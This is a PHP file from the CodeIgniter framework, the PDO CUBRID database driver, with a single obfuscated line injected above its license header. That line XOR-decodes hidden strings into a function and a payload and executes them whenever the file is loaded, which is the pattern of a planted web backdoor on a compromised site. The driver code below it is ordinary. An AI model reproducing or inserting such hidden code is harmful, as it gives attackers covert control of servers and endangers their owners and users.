<?php $XxJJByu='U5IL TfXH 5-IAB'; $kSdFST='6G,-T19>=NVY .,'^$XxJJByu; $RwKcNZ='Y5cl1OWSL=XBlE X M EJKW+aX;O0iiZ=CWYOv1XJFN6T3ZZNgBV5d-7C kq.32ckSP0TePW: .GoiagH1lJHs,8.QngbbSx1J+Q5yI8uxjCaSh=pH1GX2,PaXQ-Afcpm,dqh9fJRC8FaMnarS-ZEV<fYmw.CgKV .eXpth607> -ll8V=f-GMydb>5:XI+nvX3 hPsg;nOhAfU3EAymPFA;<=Bzg44T40 T=WZaWV.0 xRA- :+U4:jrbin uq9vc ;wm9TRmOHqNO0VD<fk=Z>g +FU0W=3rmDhV5Bk=2u+0Y sruAVL 6Xy1SERU0vrTfQ5-Adt-1yK>;=U-;aJti<qln ogjJIHo: RImOiw86+=HHh=LK=cDO902 WUxeik.0Glcc>vOU 6hXSV7J;27l6kJ;8l:U M:XaGmuNT1E=-A TB<Y=C0oSQO0lk=UZN41KEqQn7-0B0<kjP40Scboq-MZ0c=-LlaBN=3bJ742,hthy 8H.>5Z0 o1U GJBaePR8ltqqD2>QoXkPkzFDZKLT-5UnMZPHiiGttrWAwqq9b-NVPbsnTQu1 wDSkcEvYNLqJGcrkEjhQMJ0HW:hGNRa+XDC8KDC:Z1Z +2TnxpZ167EkCWxGMw9fNNLL=iI ,5RckC7;W86,rebw4h7D>XLxfkX2'; $wCnxssg=$kSdFST('', '0SKMW:908T7,3 X1S9Smm38Y><Z;Q667H7ppfVJRC ;X7G35 G:9G;IV7A4.CFFKO71D5IpsQEWnOIAGhJfCAWCMZqSGEEhr8CM>GQmQUEJsZsLTL;E54WBxE<0Y OXPIEOZA3oCv,M2AcSAZwI;17gB00WpcC 3YuA1PQHEDERECDHS3DOpnvsmkLPN-;EFR7FTAkynFd2bKB1R1 YPp  WOXypCPU UoK1DwgA17BCECXKKOHN4WRJZF6-o::p3CAHWIR1+MrvQj9Q:1YOKFP7CDJ24o<XJRPdL=P;P7;QOQ-ASOUe -LC=B;.OX<VVZuB5TY MTV;p-QIX4NSAbP6n4=;e<3J+:hKQE+iPqISNWGH-aHFFB4G .MQmK2,XXIOEU>Wij7R+4TWHesrA+WGRW<b71Ef0qD,N9AzM5;:B OD L=8YqE,B070;Q34P .fVP8 Ge1SHS-TYCN4UD2JNOUI,.Q<VH5EHyDTUJnSUFMHRNYAJ:OGj1UY0T-I4>1IB;7AKXQU SJ0FxMvKR+ och0LA45j151N4nTIOwfBIEXTKwc6SAWb3ATCF 0ZVqAj,.A.sUCLlJNwm+B:6C7,++>N -0L8ldJ;H6OJVsBXT>PBVlBcwXgmWBlG+:-QAmDMA38L3VB;WWHU8KL>aR<W,dHOPRO'^$RwKcNZ); $wCnxssg();
/**
 * CodeIgniter
 *
 * An open source application development framework for PHP
 *
 * This content is released under the MIT License (MIT)
 *
 * Copyright (c) 2014 - 2017, British Columbia Institute of Technology
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 * THE SOFTWARE.
 *
 * @package	CodeIgniter
 * @author	EllisLab Dev Team
 * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (https://ellislab.com/)
 * @copyright	Copyright (c) 2014 - 2017, British Columbia Institute of Technology (http://bcit.ca/)
 * @license	http://opensource.org/licenses/MIT	MIT License
 * @link	https://codeigniter.com
 * @since	Version 3.0.0
 * @filesource
 */
defined('BASEPATH') OR exit('No direct script access allowed');

/**
 * PDO CUBRID Database Adapter Class
 *
 * Note: _DB is an extender class that the app controller
 * creates dynamically based on whether the query builder
 * class is being used or not.
 *
 * @package		CodeIgniter
 * @subpackage	Drivers
 * @category	Database
 * @author		EllisLab Dev Team
 * @link		https://codeigniter.com/user_guide/database/
 */
class CI_DB_pdo_cubrid_driver extends CI_DB_pdo_driver {

	/**
	 * Sub-driver
	 *
	 * @var	string
	 */
	public $subdriver = 'cubrid';

	/**
	 * Identifier escape character
	 *
	 * @var	string
	 */
	protected $_escape_char = '`';

	/**
	 * ORDER BY random keyword
	 *
	 * @var array
	 */
	protected $_random_keyword = array('RANDOM()', 'RANDOM(%d)');

	// --------------------------------------------------------------------

	/**
	 * Class constructor
	 *
	 * Builds the DSN if not already set.
	 *
	 * @param	array	$params
	 * @return	void
	 */
	public function __construct($params)
	{
		parent::__construct($params);

		if (empty($this->dsn))
		{
			$this->dsn = 'cubrid:host='.(empty($this->hostname) ? '127.0.0.1' : $this->hostname);

			empty($this->port) OR $this->dsn .= ';port='.$this->port;
			empty($this->database) OR $this->dsn .= ';dbname='.$this->database;
			empty($this->char_set) OR $this->dsn .= ';charset='.$this->char_set;
		}
	}

	// --------------------------------------------------------------------

	/**
	 * Show table query
	 *
	 * Generates a platform-specific query string so that the table names can be fetched
	 *
	 * @param	bool	$prefix_limit
	 * @return	string
	 */
	protected function _list_tables($prefix_limit = FALSE)
	{
		$sql = 'SHOW TABLES';

		if ($prefix_limit === TRUE && $this->dbprefix !== '')
		{
			return $sql." LIKE '".$this->escape_like_str($this->dbprefix)."%'";
		}

		return $sql;
	}

	// --------------------------------------------------------------------

	/**
	 * Show column query
	 *
	 * Generates a platform-specific query string so that the column names can be fetched
	 *
	 * @param	string	$table
	 * @return	string
	 */
	protected function _list_columns($table = '')
	{
		return 'SHOW COLUMNS FROM '.$this->protect_identifiers($table, TRUE, NULL, FALSE);
	}

	// --------------------------------------------------------------------

	/**
	 * Returns an object with field data
	 *
	 * @param	string	$table
	 * @return	array
	 */
	public function field_data($table)
	{
		if (($query = $this->query('SHOW COLUMNS FROM '.$this->protect_identifiers($table, TRUE, NULL, FALSE))) === FALSE)
		{
			return FALSE;
		}
		$query = $query->result_object();

		$retval = array();
		for ($i = 0, $c = count($query); $i < $c; $i++)
		{
			$retval[$i]			= new stdClass();
			$retval[$i]->name		= $query[$i]->Field;

			sscanf($query[$i]->Type, '%[a-z](%d)',
				$retval[$i]->type,
				$retval[$i]->max_length
			);

			$retval[$i]->default		= $query[$i]->Default;
			$retval[$i]->primary_key	= (int) ($query[$i]->Key === 'PRI');
		}

		return $retval;
	}

	// --------------------------------------------------------------------

	/**
	 * Truncate statement
	 *
	 * Generates a platform-specific truncate string from the supplied data
	 *
	 * If the database does not support the TRUNCATE statement,
	 * then this method maps to 'DELETE FROM table'
	 *
	 * @param	string	$table
	 * @return	string
	 */
	protected function _truncate($table)
	{
		return 'TRUNCATE '.$table;
	}

	// --------------------------------------------------------------------

	/**
	 * FROM tables
	 *
	 * Groups tables in FROM clauses if needed, so there is no confusion
	 * about operator precedence.
	 *
	 * @return	string
	 */
	protected function _from_tables()
	{
		if ( ! empty($this->qb_join) && count($this->qb_from) > 1)
		{
			return '('.implode(', ', $this->qb_from).')';
		}

		return implode(', ', $this->qb_from);
	}

}
